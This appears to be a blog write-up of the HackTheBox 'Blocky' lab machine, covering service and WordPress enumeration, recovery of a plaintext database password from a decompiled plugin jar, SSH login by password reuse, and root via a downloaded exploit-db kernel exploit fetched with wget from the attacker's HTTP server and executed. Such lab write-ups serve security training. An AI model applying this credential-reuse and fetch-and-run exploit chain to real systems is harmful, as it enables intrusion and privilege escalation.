---
layout: page
title: HackTheBox Blocky Writeup
---

Blocky involves learning how using bad password policies and practices can present a vulnerability to a website. This box also simulates a website that is for a Minecraft server, but with that it emulates a young developer's configurations of a web server that's used to escalate privileges to root.

### Enumeration

First we do a standard ```nmap -sC -sV -oA 10.10.10.37```:

![image](https://user-images.githubusercontent.com/41026969/67590388-eab51800-f728-11e9-9b02-88a2df419918.png)

So we see several things:

- Port 21 is open, there's an FTP service
- Port 22 is open, there's an SSH service
- Port 80 is open, there's a Wordpress server
- Port 8192?? 

I check the FTP for anonymous login , doesn't work

Checking some default/common passwords for FTP and SSH, doesn't work

Checking out the website:

![image](https://user-images.githubusercontent.com/41026969/68036629-70dadc80-fc9c-11e9-86e6-7ce71bffc47d.png)

We see that it's a wordpress website for a minecraft server.

To do some further enumeration, I do a wordpress scan:

The first command I do is: ```wpscan --url 10.10.10.37 --enumerate u``` this scans the address and enumerates/finds users. Here's what it resulted in:

```
[+] Enumerating usernames ...
[+] Identified the following 1 user/s:
    +----+-------+---------+
    | Id | Login | Name    |
    +----+-------+---------+
    | 1  | notch | Notch – |
    +----+-------+---------+
```

Cool, we find one user: notch

Doing a similar scan for plugins (to find a potential outdated plugin that can be exploited): ```wpscan --url 10.10.10.37 --enumerate p```

```
[+] We found 1 plugins:

[+] Name: akismet - v3.3.2
 |  Last updated: 2019-04-29T18:18:00.000Z
 |  Location: http://10.10.10.37/wp-content/plugins/akismet/
 |  Readme: http://10.10.10.37/wp-content/plugins/akismet/readme.txt
[!] The version is out of date, the latest version is 4.1.1
```

Not sure if that can be useful, just going to keep that in the back pocket.

Poking arond the wordpress site, I can't find anything interesting so next I do a dirb scan to see if I can find some interesting directories or files. I add a ```-r``` at the end because when I initially did it without, the recursive enumeration was taking too long so adding the ```-r``` makes it not recusively search:

```
dirb http://10.10.10.37 -r
```

```
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Nov  1 12:39:50 2019
URL_BASE: http://10.10.10.37/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Recursive

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.37/ ----
+ http://10.10.10.37/index.php (CODE:301|SIZE:0)                                                                                                              
==> DIRECTORY: http://10.10.10.37/javascript/                                                                                                                 
==> DIRECTORY: http://10.10.10.37/phpmyadmin/                                                                                                                 
==> DIRECTORY: http://10.10.10.37/plugins/                                                                                                                    
+ http://10.10.10.37/server-status (CODE:403|SIZE:299)                                                                                                        
==> DIRECTORY: http://10.10.10.37/wiki/                                                                                                                       
==> DIRECTORY: http://10.10.10.37/wp-admin/                                                                                                                   
==> DIRECTORY: http://10.10.10.37/wp-content/                                                                                                                 
==> DIRECTORY: http://10.10.10.37/wp-includes/                                                                                                                
+ http://10.10.10.37/xmlrpc.php (CODE:405|SIZE:42)                                                                                       ----------------
END_TIME: Fri Nov  1 12:41:18 2019
DOWNLOADED: 4612 - FOUND: 3
```
Checking through each of the directories and files, we eventually come across ```http://10.10.10.37/plugins/```... Going to this directory reveals a couple interesting files:

![image](https://user-images.githubusercontent.com/41026969/68041797-b7820400-fca7-11e9-99a5-1896042c801a.png)

If you're not familiar with what a .jar file, it's basically a zip file with Java files in it. 

We can unzip the files to see what is inside it by doing ```unzip BlockCore.jar```. This extracts two directories: ```com``` and ```META-INF```. 

Going into the ```com``` directory, there's another directory called ```myfirstplugin```, going into that directory there's a java file: ```BlockyCore.class``` (A .class file is essentially compiled java code). If we want to see what this class contains, we need to decompile this file... 

### Exploitation

The java decompiler I use is [jd-gui](https://github.com/java-decompiler/jd-gui). On the github link, there's instructions on how to install/run the program. 

Upon running the pgoram, it brings up a GUI in which we can drag and drop the ```BlockyCore.class``` file to see the decompiled code. Doing so will give us the following code:

![image](https://user-images.githubusercontent.com/41026969/68055072-3dad4300-fcc6-11e9-8221-44a76c3cae54.png)

We see there's credentials stored in plaintext:

```
public String sqlUser = "root";
public String sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
```

Trying to logon as root on the FTP and SSH services yields no results. So referring to the wordpress enumeration scans from above, we see there's a user we can try this password on: ```notch```.

Checking against ssh: ```ssh -l notch 10.10.10.37``` and typing in the password, we get a shell!

Doing a ```id``` check reveals we are user notch.

Looking around the server we see there's a ```/root``` directory but trying to get into it we get access denied.

##### Privilege Escalation 

Since we have a user shell, we can still do some more enumeration to find out more about the server:

Reading the OS version file by doing ```cat /etc/os-release``` spits out:

```
NAME="Ubuntu"
VERSION="16.04.2 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.2 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial
```

Doing one more check by doing ```hostnamectl``` tells us:

```
   Static hostname: Blocky
         Icon name: computer-vm
           Chassis: vm
        Machine ID: b927797b27465e4b27172dd35958fd55
           Boot ID: 3ec0cf7c85424f03b77ab68129ff2d54
    Virtualization: vmware
  Operating System: Ubuntu 16.04.2 LTS
            Kernel: Linux 4.4.0-62-generic
      Architecture: x86-64

```

Doing some research I come across [this exploit-db exploit](https://www.exploit-db.com/exploits/44298). 

I download the c file, and compile using ```gcc```. Next, I need to get the .exe file on the victim machine. To do so, I use python's SimpleHTTPServer and wget to do so. Here are the instructions I did.

1. In the directory where the exe file is (on the host computer), I do ```pythom -m SimpleHTTPServer```

![image](https://user-images.githubusercontent.com/41026969/68057294-d7c3ba00-fccb-11e9-967d-1c62bfbe77d1.png)

2. Now on the host machine (in notch home directory, somewhere we have read/write/execute permissions), I do ```wget [IP]:8000/44298```. ```8000``` is the port number that the SimpleHTTPServer is being hosted on, and ```44298``` is the executable file. Doing so correctly, the shell running the SimpleHTTPServer should output a ```GET``` request from the victim IP ```10.10.10.37```. 

3. Now that we got the executable on the remote machine, we need to give it permission to execute: ```chmod +x 44298```.

Below is steps two and three being shown:

![image](https://user-images.githubusercontent.com/41026969/68057677-08582380-fccd-11e9-9d48-636ff233cd97.png)

Now all we have to do is run the executable ```./44298```:

![image](https://user-images.githubusercontent.com/41026969/68057728-30478700-fccd-11e9-9cf0-29ad480e7aff.png)

### Flags

user: ```/home/notch/user.txt```

root: ```/root/root.txt ```